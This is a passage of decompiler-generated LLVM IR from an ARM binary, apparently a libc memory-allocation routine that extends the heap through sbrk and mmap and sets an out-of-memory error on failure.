  store i32 %v2_154dc, i32* %r1.global-to-local, align 4
  %v1_154e0 = load i32, i32* %r2.global-to-local, align 4
  %v0_154e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_154e4 = add i32 %v0_154e4, 8
  store i32 %v1_154e4, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_154dc, %v1_154e0
  br i1 %tmp213, label %bb151, label %dec_label_pc_157f0

bb151:                                            ; preds = %bb150
  %v5_154e8 = load i32, i32* %ip.global-to-local, align 4
  %v6_154e8 = add i32 %v5_154e8, 884
  %v7_154e8 = inttoptr i32 %v6_154e8 to i32*
  store i32 %v2_154dc, i32* %v7_154e8, align 4
  br label %dec_label_pc_157f0

dec_label_pc_154f0:                               ; preds = %dec_label_pc_15434, %dec_label_pc_15414, %dec_label_pc_15448.dec_label_pc_154f0_crit_edge, %dec_label_pc_15424
  %v1_15514 = phi i32 [ %v1_15514.pre, %dec_label_pc_15448.dec_label_pc_154f0_crit_edge ], [ %v0_153bc, %dec_label_pc_15424 ], [ %v0_153bc, %dec_label_pc_15414 ], [ %v0_153bc, %dec_label_pc_15434 ]
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  %v4_154f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_154f8, i32* %r3.global-to-local, align 4
  %v1_154fc = add i32 %v4_154f8, 44
  %v2_154fc = inttoptr i32 %v1_154fc to i32*
  %v3_154fc = load i32, i32* %v2_154fc, align 4
  store i32 %v3_154fc, i32* %r0.global-to-local, align 4
  %v1_15500 = add i32 %v4_154f8, 864
  %v2_15500 = inttoptr i32 %v1_15500 to i32*
  %v3_15500 = load i32, i32* %v2_15500, align 4
  store i32 %v3_15500, i32* %r2.global-to-local, align 4
  %v1_15504 = add i32 %v4_154f8, 840
  %v2_15504 = inttoptr i32 %v1_15504 to i32*
  %v3_15504 = load i32, i32* %v2_15504, align 4
  store i32 %v3_15504, i32* %r3.global-to-local, align 4
  %v1_15508 = add i32 %v3_154fc, 4
  %v2_15508 = inttoptr i32 %v1_15508 to i32*
  %v3_15508 = load i32, i32* %v2_15508, align 4
  store i32 %v3_15508, i32* %r1.global-to-local, align 4
  %v1_15510 = urem i32 %v3_15500, 2
  %v2_15510 = icmp eq i32 %v1_15510, 0
  %v1_1550c = add i32 %v1_15514, 16
  %v2_15514 = add i32 %v1_1550c, %v3_15504
  store i32 %v2_15514, i32* %r3.global-to-local, align 4
  %v1_15518 = and i32 %v3_15508, -4
  store i32 %v1_15518, i32* @r8, align 4
  br i1 %v2_15510, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_154f0
  %v3_1551c = sub i32 %v2_15514, %v1_15518
  store i32 %v3_1551c, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_154f0, %bb152
  %v0_15520 = phi i32 [ %v2_15514, %dec_label_pc_154f0 ], [ %v3_1551c, %bb152 ]
  %v1_15520 = load i32, i32* %sb.global-to-local, align 4
  %v2_15520 = add i32 %v1_15520, %v0_15520
  store i32 %v2_15520, i32* %r3.global-to-local, align 4
  %v1_15524 = sub i32 -1, %v1_15520
  store i32 %v1_15524, i32* %fp.global-to-local, align 4
  %v2_15528 = and i32 %v2_15520, %v1_15524
  store i32 %v2_15528, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_15528, 1
  br i1 %tmp154, label %dec_label_pc_1554c, label %dec_label_pc_15538

dec_label_pc_15538:                               ; preds = %bb153
  store i32 %v2_15528, i32* %r0.global-to-local, align 4
  %v1_1553c = call i32 @__GI_sbrk(i32 %v2_15528)
  store i32 %v1_1553c, i32* %r0.global-to-local, align 4
  %v3_15540 = icmp eq i32 %v1_1553c, -1
  store i32 %v1_1553c, i32* @r4, align 4
  br i1 %v3_15540, label %dec_label_pc_1554c, label %dec_label_pc_155b8

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15538, %bb153
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_15554 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15554, i32* %r6.global-to-local, align 4
  %v1_15558 = add i32 %v4_15554, 864
  %v2_15558 = inttoptr i32 %v1_15558 to i32*
  %v3_15558 = load i32, i32* %v2_15558, align 4
  store i32 %v3_15558, i32* %r3.global-to-local, align 4
  %v1_1555c = urem i32 %v3_15558, 2
  %v2_1555c = icmp eq i32 %v1_1555c, 0
  br i1 %v2_1555c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_1554c
  %v1_15560 = load i32, i32* @r8, align 4
  %v2_15560 = load i32, i32* %sb.global-to-local, align 4
  %v3_15560 = add i32 %v2_15560, %v1_15560
  %v2_15564 = load i32, i32* @r5, align 4
  %v3_15564 = add i32 %v3_15560, %v2_15564
  store i32 %v3_15564, i32* %r3.global-to-local, align 4
  %v2_15568 = load i32, i32* %fp.global-to-local, align 4
  %v3_15568 = and i32 %v2_15568, %v3_15564
  store i32 %v3_15568, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_1554c
  %v0_1556c.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_1556c = phi i32 [ %v0_1556c.pr, %.thread29thread-pre-split ], [ %v3_15568, %bb155 ]
  %v2_1556c = icmp ugt i32 %v0_1556c, 1048575
  br i1 %v2_1556c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_15584 = phi i32 [ %v0_1556c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_15574 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_15584, %v1_15574
  br i1 %tmp214, label %dec_label_pc_1557c, label %dec_label_pc_157e0

dec_label_pc_1557c:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_15584, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15598 = call i32 @mmap(i32 0, i32 %v0_15584, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15598, i32* %r0.global-to-local, align 4
  %v3_1559c = icmp eq i32 %v6_15598, -1
  %v8_1559c = icmp eq i32 %v6_15598, -1
  store i32 %v6_15598, i32* @r4, align 4
  br i1 %v8_1559c, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_1557c
  %v1_155a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 864
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  %v4_155a4 = load i32, i32* %v3_155a4, align 4
  %v2_155a8 = load i32, i32* @r5, align 4
  %v3_155a8 = add i32 %v2_155a8, %v6_15598
  store i32 %v3_155a8, i32* %r0.global-to-local, align 4
  %v2_155ac = and i32 %v4_155a4, -2
  store i32 %v2_155ac, i32* %r3.global-to-local, align 4
  store i32 %v2_155ac, i32* %v3_155a4, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_1557c, %bb158
  br i1 %v3_1559c, label %dec_label_pc_155b8, label %dec_label_pc_155bc

dec_label_pc_155b8:                               ; preds = %.thread32, %dec_label_pc_15538
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %.thread32, %dec_label_pc_155b8
  %v0_155bc = load i32, i32* @r4, align 4
  %v7_155bc = icmp eq i32 %v0_155bc, -1
  br i1 %v7_155bc, label %dec_label_pc_157e0, label %dec_label_pc_155c4

dec_label_pc_155c4:                               ; preds = %dec_label_pc_155bc
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v4_155cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_155cc, i32* %ip.global-to-local, align 4
  store i32 %v3_154fc, i32* %r2.global-to-local, align 4
  %v1_155d4 = add i32 %v4_155cc, 872
  %v2_155d4 = inttoptr i32 %v1_155d4 to i32*
  %v3_155d4 = load i32, i32* %v2_155d4, align 4
  %v1_155d8 = load i32, i32* @r8, align 4
  %v2_155d8 = add i32 %v1_155d8, %v3_154fc
  store i32 %v2_155d8, i32* %r1.global-to-local, align 4
  %v0_155dc = load i32, i32* @r5, align 4
  %v2_155dc = add i32 %v0_155dc, %v3_155d4
  store i32 %v2_155dc, i32* %r3.global-to-local, align 4
  %v9_155e0 = icmp eq i32 %v0_155bc, %v2_155d8
  br i1 %v9_155e0, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_155c4
  store i32 %v2_155dc, i32* %v2_155d4, align 4
  br label %dec_label_pc_155fc

bb159:                                            ; preds = %dec_label_pc_155c4
  %v1_155e4 = load i32, i32* %r0.global-to-local, align 4
  %v8_155e4 = icmp eq i32 %v1_155e4, -1
  store i32 %v2_155dc, i32* %v2_155d4, align 4
  br i1 %v8_155e4, label %.thread34, label %dec_label_pc_155fc

.thread34:                                        ; preds = %bb159
  %v1_155ec = load i32, i32* @r5, align 4
  %v2_155ec = load i32, i32* @r8, align 4
  %v3_155ec = add i32 %v2_155ec, %v1_155ec
  %v2_155f0 = or i32 %v3_155ec, 1
  store i32 %v2_155f0, i32* %r3.global-to-local, align 4
  %v2_155f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_155f4 = add i32 %v2_155f4, 4
  %v4_155f4 = inttoptr i32 %v3_155f4 to i32*
  store i32 %v2_155f0, i32* %v4_155f4, align 4
  br label %dec_label_pc_15774

dec_label_pc_155fc:                               ; preds = %bb159, %.thread122
  %v0_15600.pr = load i32, i32* @r8, align 4
  %v0_155fc = load i32, i32* %ip.global-to-local, align 4
  %v1_155fc = add i32 %v0_155fc, 864
  %v2_155fc = inttoptr i32 %v1_155fc to i32*
  %v3_155fc = load i32, i32* %v2_155fc, align 4
  store i32 %v3_155fc, i32* %r2.global-to-local, align 4
  %v2_15600 = icmp eq i32 %v0_15600.pr, 0
  br i1 %v2_15600, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_155fc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_155fc
  %v2_15608 = urem i32 %v3_155fc, 2
  store i32 %v2_15608, i32* %r3.global-to-local, align 4
  %v2_1560c = icmp eq i32 %v2_15608, 0
  br i1 %v2_1560c, label %.thread40, label %dec_label_pc_15614

dec_label_pc_15614:                               ; preds = %.thread36
  %v0_15614 = load i32, i32* @r4, align 4
  %v1_15614 = load i32, i32* %r1.global-to-local, align 4
  %v3_15614 = icmp ult i32 %v0_15614, %v1_15614
  br i1 %v3_15614, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_15614
  %v2_15618 = and i32 %v3_155fc, -2
  store i32 %v2_15618, i32* %r3.global-to-local, align 4
  store i32 %v2_15618, i32* %v2_155fc, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_15614, %.thread37, %.thread36, %bb160
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  %v4_15628 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15628, i32* @r7, align 4
  %v1_1562c = add i32 %v4_15628, 864
  %v2_1562c = inttoptr i32 %v1_1562c to i32*
  %v3_1562c = load i32, i32* %v2_1562c, align 4
  store i32 %v3_1562c, i32* %r3.global-to-local, align 4
  %v1_15630 = urem i32 %v3_1562c, 2
  store i32 %v1_15630, i32* @r6, align 4
  %v2_15630 = icmp eq i32 %v1_15630, 0
  br i1 %v2_15630, label %dec_label_pc_156c4, label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %.thread40
  %v0_15638 = load i32, i32* @r8, align 4
  %v2_15638 = icmp eq i32 %v0_15638, 0
  br i1 %v2_15638, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_15638
  %v2_1563c = add i32 %v4_15628, 872
  %v3_1563c = inttoptr i32 %v2_1563c to i32*
  %v4_1563c = load i32, i32* %v3_1563c, align 4
  store i32 %v4_1563c, i32* %r2.global-to-local, align 4
  %v1_15640 = load i32, i32* %r1.global-to-local, align 4
  %v2_15640 = load i32, i32* @r4, align 4
  %v3_15640 = sub i32 %v2_15640, %v1_15640
  %v3_15644 = add i32 %v3_15640, %v4_1563c
  store i32 %v3_15644, i32* %r3.global-to-local, align 4
  store i32 %v3_15644, i32* %v3_1563c, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_15638, %bb161
  %v0_1564c = load i32, i32* @r4, align 4
  %v1_1564c = urem i32 %v0_1564c, 8
  store i32 %v1_1564c, i32* %r3.global-to-local, align 4
  %v2_1564c = icmp eq i32 %v1_1564c, 0
  br i1 %v2_1564c, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_15650 = sub nsw i32 8, %v1_1564c
  store i32 %v2_15650, i32* %r3.global-to-local, align 4
  %v3_15654 = add i32 %v2_15650, %v0_1564c
  store i32 %v3_15654, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_1565c = phi i32 [ 0, %.thread43 ], [ %v2_15650, %bb162 ]
  %v1_15658 = load i32, i32* @r5, align 4
  %v2_15658 = add i32 %v1_15658, %v0_1564c
  store i32 %v2_15658, i32* @r6, align 4
  %v1_1565c = load i32, i32* @r8, align 4
  %v2_1565c = add i32 %v2_15658, %v0_1565c
  %v2_15660 = add i32 %v2_1565c, %v1_1565c
  store i32 %v2_15660, i32* %r1.global-to-local, align 4
  %v1_15664 = load i32, i32* %sb.global-to-local, align 4
  %v2_15664 = add i32 %v1_15664, %v2_15660
  %v1_15668 = load i32, i32* %fp.global-to-local, align 4
  %v2_15668 = and i32 %v1_15668, %v2_15664
  store i32 %v2_15668, i32* %r2.global-to-local, align 4
  %v2_1566c = sub i32 0, %v2_15658
  store i32 %v2_1566c, i32* %r3.global-to-local, align 4
  %v2_15670 = sub i32 %v2_15668, %v2_15658
  store i32 %v2_15670, i32* @r5, align 4
  store i32 %v2_15670, i32* %r0.global-to-local, align 4
  br i1 %v2_1564c, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_1564c, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_1567c = call i32 @__GI_sbrk(i32 %v2_15670)
  store i32 %v1_1567c, i32* %r0.global-to-local, align 4
  %v3_15680 = icmp eq i32 %v1_1567c, -1
  br i1 %v3_15680, label %dec_label_pc_15688, label %dec_label_pc_15698

dec_label_pc_15688:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1568c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1568c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_156f0

dec_label_pc_15698:                               ; preds = %bb164
  %v1_15698 = load i32, i32* @r4, align 4
  %v3_15698 = icmp ult i32 %v1_1567c, %v1_15698
  br i1 %v3_15698, label %dec_label_pc_156a0, label %dec_label_pc_156f0

dec_label_pc_156a0:                               ; preds = %dec_label_pc_15698
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r0.global-to-local, align 4
  %v4_156a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_156a8, i32* %r2.global-to-local, align 4
  %v1_156ac = add i32 %v4_156a8, 864
  %v2_156ac = inttoptr i32 %v1_156ac to i32*
  %v3_156ac = load i32, i32* %v2_156ac, align 4
  %v0_156b0 = load i32, i32* @r6, align 4
  store i32 %v0_156b0, i32* %r0.global-to-local, align 4
  %v1_156b4 = and i32 %v3_156ac, -2
  store i32 %v1_156b4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_156b4, i32* %v2_156ac, align 4
  br label %dec_label_pc_156f0

dec_label_pc_156c4:                               ; preds = %.thread40
  %v0_156c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_156c4 = icmp eq i32 %v0_156c4, -1
  br i1 %v3_156c4, label %dec_label_pc_156cc, label %dec_label_pc_156e8

dec_label_pc_156cc:                               ; preds = %dec_label_pc_156c4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_156d0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_156d0, i32* %r0.global-to-local, align 4
  %v0_156d4 = load i32, i32* @r7, align 4
  %v1_156d4 = add i32 %v0_156d4, 872
  %v2_156d4 = inttoptr i32 %v1_156d4 to i32*
  %v3_156d4 = load i32, i32* %v2_156d4, align 4
  store i32 %v3_156d4, i32* %r2.global-to-local, align 4
  %v0_156d8 = load i32, i32* @r4, align 4
  %v0_156dc = load i32, i32* @r5, align 4
  %v2_156d8 = add i32 %v3_156d4, %v1_156d0
  %v2_156dc = sub i32 %v2_156d8, %v0_156d8
  %v2_156e0 = sub i32 %v2_156dc, %v0_156dc
  store i32 %v2_156e0, i32* %r3.global-to-local, align 4
  store i32 %v2_156e0, i32* %v2_156d4, align 4
  %v0_156ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156c4, %dec_label_pc_156cc
  %v0_156ec = phi i32 [ 0, %dec_label_pc_156c4 ], [ %v0_156ec.pre, %dec_label_pc_156cc ]
  %v0_156e8 = load i32, i32* @r4, align 4
  store i32 %v0_156e8, i32* @r7, align 4
  store i32 %v0_156ec, i32* @r5, align 4
  br label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %dec_label_pc_15698, %dec_label_pc_156a0, %dec_label_pc_15688, %dec_label_pc_156e8
  %v0_156f0 = load i32, i32* %r0.global-to-local, align 4
  %v7_156f0 = icmp eq i32 %v0_156f0, -1
  br i1 %v7_156f0, label %dec_label_pc_15774, label %dec_label_pc_156f8

dec_label_pc_156f8:                               ; preds = %dec_label_pc_156f0
  %v1_156f8 = load i32, i32* @r5, align 4
  %v2_156f8 = add i32 %v1_156f8, %v0_156f0
  %v0_156fc = load i32, i32* @r7, align 4
  %v2_156fc = sub i32 %v2_156f8, %v0_156fc
  %v1_15700 = or i32 %v2_156fc, 1
  %v2_15704 = add i32 %v0_156fc, 4
  %v3_15704 = inttoptr i32 %v2_15704 to i32*
  store i32 %v1_15700, i32* %v3_15704, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_15710 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15710, i32* @r6, align 4
  %v1_15714 = add i32 %v4_15710, 872
  %v2_15714 = inttoptr i32 %v1_15714 to i32*
  %v3_15714 = load i32, i32* %v2_15714, align 4
  %v0_15718 = load i32, i32* @r8, align 4
  %v2_15718 = icmp eq i32 %v0_15718, 0
  %v0_1571c = load i32, i32* @r5, align 4
  %v2_1571c = add i32 %v0_1571c, %v3_15714
  store i32 %v2_1571c, i32* %r3.global-to-local, align 4
  store i32 %v2_1571c, i32* %v2_15714, align 4
  %v0_15724 = load i32, i32* @r7, align 4
  %v1_15724 = load i32, i32* @r6, align 4
  %v2_15724 = add i32 %v1_15724, 44
  %v3_15724 = inttoptr i32 %v2_15724 to i32*
  store i32 %v0_15724, i32* %v3_15724, align 4
  br i1 %v2_15718, label %dec_label_pc_15774, label %dec_label_pc_1572c

dec_label_pc_1572c:                               ; preds = %dec_label_pc_156f8
  %v0_15730 = load i32, i32* @r8, align 4
  %v1_15730 = add i32 %v0_15730, -12
  %v1_15734 = and i32 %v1_15730, -8
  store i32 %v3_154fc, i32* %ip.global-to-local, align 4
  %v2_1573c = add i32 %v1_15734, %v3_154fc
  store i32 %v2_1573c, i32* %r1.global-to-local, align 4
  %v2_15740 = icmp ugt i32 %v1_15734, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_15748 = or i32 %v1_15734, 1
  store i32 %v1_15748, i32* %r3.global-to-local, align 4
  store i32 %v1_15748, i32* %v2_15508, align 4
  %v0_15750 = load i32, i32* %r2.global-to-local, align 4
  %v1_15750 = load i32, i32* %r1.global-to-local, align 4
  %v2_15750 = add i32 %v1_15750, 8
  %v3_15750 = inttoptr i32 %v2_15750 to i32*
  store i32 %v0_15750, i32* %v3_15750, align 4
  %v0_15754 = load i32, i32* %r2.global-to-local, align 4
  %v1_15754 = load i32, i32* %r1.global-to-local, align 4
  %v2_15754 = add i32 %v1_15754, 4
  %v3_15754 = inttoptr i32 %v2_15754 to i32*
  store i32 %v0_15754, i32* %v3_15754, align 4
  br i1 %v2_15740, label %dec_label_pc_1575c, label %dec_label_pc_15774

dec_label_pc_1575c:                               ; preds = %dec_label_pc_1572c
  %v0_1575c = load i32, i32* @r6, align 4
  %v1_1575c = add i32 %v0_1575c, 836
  %v2_1575c = inttoptr i32 %v1_1575c to i32*
  %v3_1575c = load i32, i32* %v2_1575c, align 4
  store i32 %v3_1575c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_15764 = load i32, i32* %ip.global-to-local, align 4
  %v1_15764 = add i32 %v0_15764, 8
  store i32 %v1_15764, i32* @r0, align 4
  store i32 -1, i32* %v2_1575c, align 4
  %v0_1576c = call i32 @free()
  store i32 %v0_1576c, i32* %r0.global-to-local, align 4
  %v0_15770 = load i32, i32* @r4, align 4
  %v1_15770 = load i32, i32* @r6, align 4
  %v2_15770 = add i32 %v1_15770, 836
  %v3_15770 = inttoptr i32 %v2_15770 to i32*
  store i32 %v0_15770, i32* %v3_15770, align 4
  br label %dec_label_pc_15774

dec_label_pc_15774:                               ; preds = %.thread34, %dec_label_pc_1572c, %dec_label_pc_156f8, %dec_label_pc_156f0, %dec_label_pc_1575c
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r0.global-to-local, align 4
  %v4_1577c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_1577c, i32* %lr.global-to-local, align 4
  %v1_15780 = add i32 %v4_1577c, 872
  store i32 %v1_15780, i32* %r1.global-to-local, align 4
  %v1_15784 = inttoptr i32 %v1_15780 to i32*
  %v2_15784 = load i32, i32* %v1_15784, align 4
  store i32 %v2_15784, i32* %r1.global-to-local, align 4
  %v3_15784 = add i32 %v4_1577c, 876
  %v4_15784 = inttoptr i32 %v3_15784 to i32*
  %v5_15784 = load i32, i32* %v4_15784, align 4
  store i32 %v5_15784, i32* %r3.global-to-local, align 4
  %v1_1578c = add i32 %v4_1577c, 868
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  %v3_1578c = load i32, i32* %v2_1578c, align 4
  store i32 %v3_1578c, i32* %r3.global-to-local, align 4
  %v1_15790 = add i32 %v4_1577c, 884
  %v2_15790 = inttoptr i32 %v1_15790 to i32*
  %v3_15790 = load i32, i32* %v2_15790, align 4
  store i32 %v3_15790, i32* %r2.global-to-local, align 4
  %v2_15794 = add i32 %v3_1578c, %v2_15784
  store i32 %v2_15794, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_15784, %v5_15784
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_15774
  store i32 %v2_15784, i32* %v4_15784, align 4
  %v0_1579c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1579c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_15774, %bb165
  %v1_1579c = phi i32 [ %v3_15790, %dec_label_pc_15774 ], [ %v1_1579c.pre, %bb165 ]
  %v4_157a0 = phi i32 [ %v2_15794, %dec_label_pc_15774 ], [ %v0_1579c.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_157a0, %v1_1579c
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_157a0 = load i32, i32* %lr.global-to-local, align 4
  %v6_157a0 = add i32 %v5_157a0, 884
  %v7_157a0 = inttoptr i32 %v6_157a0 to i32*
  store i32 %v4_157a0, i32* %v7_157a0, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_157a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_157a4 = add i32 %v0_157a4, 44
  %v2_157a4 = inttoptr i32 %v1_157a4 to i32*
  %v3_157a4 = load i32, i32* %v2_157a4, align 4
  store i32 %v3_157a4, i32* %ip.global-to-local, align 4
  %v1_157a8 = add i32 %v3_157a4, 4
  %v2_157a8 = inttoptr i32 %v1_157a8 to i32*
  %v3_157a8 = load i32, i32* %v2_157a8, align 4
  store i32 %v1_153bc, i32* %r1.global-to-local, align 4
  %v1_157b0 = and i32 %v3_157a8, -4
  store i32 %v1_157b0, i32* %r3.global-to-local, align 4
  %v3_157b4 = icmp ult i32 %v1_157b0, %v1_153bc
  br i1 %v3_157b4, label %dec_label_pc_157e0, label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %bb168
  %v0_157bc = load i32, i32* @sl, align 4
  %v2_157bc = sub i32 %v1_157b0, %v0_157bc
  %v2_157c0 = add i32 %v0_157bc, %v3_157a4
  store i32 %v2_157c0, i32* %r1.global-to-local, align 4
  %v1_157c4 = or i32 %v2_157bc, 1
  store i32 %v1_157c4, i32* %r3.global-to-local, align 4
  %v1_157c8 = or i32 %v0_157bc, 1
  store i32 %v1_157c8, i32* %r2.global-to-local, align 4
  %v1_157cc = add i32 %v3_157a4, 8
  store i32 %v1_157cc, i32* %r0.global-to-local, align 4
  store i32 %v1_157c8, i32* %v2_157a8, align 4
  %v0_157d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_157d4 = load i32, i32* %lr.global-to-local, align 4
  %v2_157d4 = add i32 %v1_157d4, 44
  %v3_157d4 = inttoptr i32 %v2_157d4 to i32*
  store i32 %v0_157d4, i32* %v3_157d4, align 4
  %v0_157d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_157d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_157d8 = add i32 %v1_157d8, 4
  %v3_157d8 = inttoptr i32 %v2_157d8 to i32*
  store i32 %v0_157d8, i32* %v3_157d8, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157e0:                               ; preds = %bb157, %bb168, %dec_label_pc_155bc
  %v0_157e0 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_157e8 = inttoptr i32 %v0_157e0 to i32*
  store i32 12, i32* %v2_157e8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_157f0:                               ; preds = %bb151, %bb150, %dec_label_pc_157bc, %dec_label_pc_15404, %dec_label_pc_157e0
  %v0_157f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157f0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_157f4

dec_label_pc_157f4:                               ; preds = %.thread1, %dec_label_pc_153d0, %.thread121, %dec_label_pc_15240, %dec_label_pc_15234, %dec_label_pc_1509c, %dec_label_pc_15020, %dec_label_pc_157f0
  store i32 %v2_14f48, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v4_15804 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 28) to i32*), align 4
  store i32 %v4_15804, i32* @ip, align 4
  store i32 88080, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15804)
  br label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_14f80, %dec_label_pc_157f4
  %v0_15810 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15810, i32* %r0.global-to-local, align 4
  store i32 %v3_14f1c, i32* @r4, align 4
  store i32 %v6_14f1c, i32* @r5, align 4
  store i32 %v9_14f1c, i32* @r6, align 4
  store i32 %v12_14f1c, i32* @r7, align 4
  store i32 %v15_14f1c, i32* @r8, align 4
  store i32 %v18_14f1c, i32* @sb, align 4
  store i32 %v21_14f1c, i32* @sl, align 4
  store i32 %v24_14f1c, i32* @fp, align 4
  store i32 %v27_14f1c, i32* @lr, align 4
  ret i32 %v0_15810

; uselistorder directives
  uselistorder i32 %v0_157bc, { 1, 0, 2 }
  uselistorder i32 %v3_157a4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_157a0, { 1, 0 }
  uselistorder i32 %v2_15784, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1577c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_15734, { 1, 2, 0 }
  uselistorder i32 %v0_156fc, { 1, 0 }
  uselistorder i32 %v0_156f0, { 1, 0 }
  uselistorder i32 %v2_156e0, { 1, 0 }
  uselistorder i32 %v2_15670, { 2, 1, 0 }
